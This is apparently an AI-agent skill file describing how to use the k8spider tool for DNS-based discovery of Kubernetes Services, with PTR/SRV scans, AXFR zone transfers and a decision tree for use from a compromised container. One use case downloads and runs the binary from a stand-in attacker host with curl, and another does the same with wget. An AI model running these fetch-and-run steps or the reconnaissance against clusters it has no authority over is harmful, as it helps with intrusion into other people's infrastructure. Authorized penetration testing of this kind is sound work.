---
name: k8spider
description: "Use k8spider for Kubernetes cluster DNS service discovery and reconnaissance. Use when you need to enumerate Services in a K8s cluster with low privileges, probe DNS services, scan network segments for PTR/SRV records, or attempt AXFR zone transfers. k8spider only needs DNS access to discover every service inside the cluster, with no API Server access required. Use this skill for K8s service discovery, DNS reconnaissance, cluster information gathering, PTR scanning, and SRV enumeration scenarios. It should also trigger when the user mentions k8spider, K8s DNS enumeration, cluster service scanning, or DNS zone transfers"
zh-signals: "使用 k8spider 通过 DNS 低权限枚举 Kubernetes 集群 Service，执行 PTR/SRV 扫描与 AXFR 区域传输。信号:k8spider,K8s DNS,服务发现,PTR/SRV,AXFR"
when-to-use: >-
  Use when enumerating Kubernetes Services via DNS with low privileges, scanning PTR/SRV records,
  or attempting AXFR zone transfers on an authorized cluster.
metadata:
  tags: "k8spider,kubernetes,k8s,dns,service discovery,PTR,SRV,AXFR,recon,reconnaissance,service discovery,cluster scanning"
  category: "tool"
---

# K8Spider — Kubernetes DNS Service Discovery

k8spider is a DNS-based K8s service discovery tool — **it only needs access to the cluster DNS to enumerate all Services with low privileges**. No API Server token, no special permissions, pure DNS queries.

Project URL: https://github.com/Esonhugh/k8spider

## Step 1: Run directly (with default parameters)

k8spider automatically reads the DNS server address from `/etc/resolv.conf` and uses built-in default CIDRs. Run it first:

```bash
k8spider all
```

If there is output, the default parameters worked — go straight to the analysis phase.

## Step 2: Manually gather network information when the default parameters return nothing

If `k8spider all` finds nothing, the default CIDR or DNS is wrong, so collect the real parameters from the current machine.

### Determine the target CIDR (-c parameter)

The CIDR segment must be extracted from the network configuration of the current container:

```bash
# Method 1: get it from the environment variable (injected by K8s)
echo $KUBERNETES_SERVICE_HOST
# The subnet of the returned IP is usually the Service CIDR range

# Method 2: infer it from the IP address
ip addr show  # or ifconfig
# Find the container's own IP and mask, then infer the segment

# Method 3: infer it from the routing table
ip route
# Inspect the routing information and infer the cluster segment range
```

The Pod segment and the Service segment are usually adjacent /16s, so the possible Service CIDR range can be inferred from the container's own IP.

### Determine and verify the DNS server (-d parameter)

The DNS address must be found through a reliable method and verified as working:

```bash
# Method 1: read it from resolv.conf (the most reliable)
cat /etc/resolv.conf
# The nameserver line is the cluster DNS address

# Method 2: locate it with the built-in k8spider command
k8spider whereisdns

# Verify that the DNS is reachable and responding
nslookup kubernetes.default.svc.cluster.local <DNS_IP>
# or
dig @<DNS_IP> kubernetes.default.svc.cluster.local
# A normal answer means the DNS is usable
```

Run it with the verified DNS:

```bash
k8spider all -d <DNS_IP> -c <CIDR>
```

## Core Commands

### Full Scan (recommended first choice)

Run every discovery method in one shot to get the most complete service list:

```bash
# Try the default parameters first
k8spider all

# When the defaults do not work, use the manually collected parameters
k8spider all -c <CIDR> -d <DNS_IP>

# Example output:
# [PTR] 10.43.0.10 -> dns-default.kube-system.svc.cluster.local
# [PTR] 10.43.0.1 -> kube-dns.kube-system.svc.cluster.local
# [SRV] _http._tcp.kubernetes.default.svc.cluster.local -> 10.43.0.1:443
```

### PTR Record Scanning (reverse DNS)

Look up domains by IP and scan the segment IP by IP:

```bash
k8spider ptr -c <CIDR>
```

The logic of the PTR scan: issue a reverse DNS query for every IP in the CIDR, K8s DNS returns domains in the `svc-name.namespace.svc.cluster.local` format, directly exposing service names and namespaces.

### SRV Record Enumeration

Query DNS SRV records to discover service ports:

```bash
k8spider srv -c <CIDR> -z cluster.local
```

### Wildcard DNS Querying

Exploit the wildcard resolution behavior of K8s DNS to discover services:

```bash
k8spider wild -c <CIDR> -z cluster.local
```

### AXFR Zone Transfer

Attempt a DNS zone transfer to obtain all records of the whole zone at once:

```bash
k8spider axfr -z cluster.local -d <DNS_IP>
```

Note: AXFR is usually restricted, but it is worth trying — if it succeeds, this is the fastest and most complete method.

### Same-Segment Scanning

Discover services in the subnet where the DNS service lives:

```bash
k8spider neighbor -d <DNS_IP>
```

### Subnet Calculation and Scanning

Automatically calculate and scan the subnet where the DNS service lives:

```bash
k8spider subnet -d <DNS_IP>
```

### kube-state-metrics Parsing

Extract service information from the kube-state-metrics endpoint:

```bash
k8spider metrics
```

## Global Options

| Option | Description | Default |
|------|------|--------|
| `-c` | Target CIDR segment | Built-in default, depends on the environment |
| `-z` | DNS zone name | `cluster.local` |
| `-d` | DNS server address | Read from resolv.conf |
| `-t` | Enable multithreading | Off |
| `-n` | Number of threads | 10 |

## Use Cases

### Use Case 1: Inside a Pod (container shell already obtained)

```bash
# Deliver the binary into the container
curl -o /tmp/k8spider https://ATTACKER/k8spider && chmod +x /tmp/k8spider

# Run it with the default parameters
/tmp/k8spider all

# If there are no results, collect network information and specify it manually
```

### Use Case 2: Through kubectl

```bash
# Execute in an existing pod
kubectl exec -it target-pod -- ./k8spider all

# Or create a temporary pod
kubectl run k8spider --image=busybox --restart=Never -- \
  wget -O /tmp/k8spider URL && /tmp/k8spider all
```

### Use Case 3: Remote usage (requires reachable DNS)

```bash
# You must specify -d and -c manually; the defaults are basically useless in a remote environment
k8spider all -c <CIDR> -d <DNS_IP> -z cluster.local
```

## Decision Tree

```
After getting into the container:
├─ Step 1: k8spider all (run it with the default parameters)
├─ Results present → analyze the output to get the service list
├─ No results      → collect network information
│   ├─ Get the CIDR: infer it from ip addr / ifconfig / environment variables
│   ├─ Get the DNS: cat /etc/resolv.conf or k8spider whereisdns
│   └─ Verify the DNS: nslookup kubernetes.default.svc.cluster.local <DNS_IP>
├─ Rerun with the collected parameters: k8spider all -c <CIDR> -d <DNS_IP>
├─ Want port information → k8spider srv
├─ Gamble on a full transfer → k8spider axfr
├─ Want fast discovery → k8spider neighbor / k8spider subnet
├─ There is a metrics endpoint → k8spider metrics
└─ The segment is large and it is slow → add -t -n 50 to enable multithreading
```
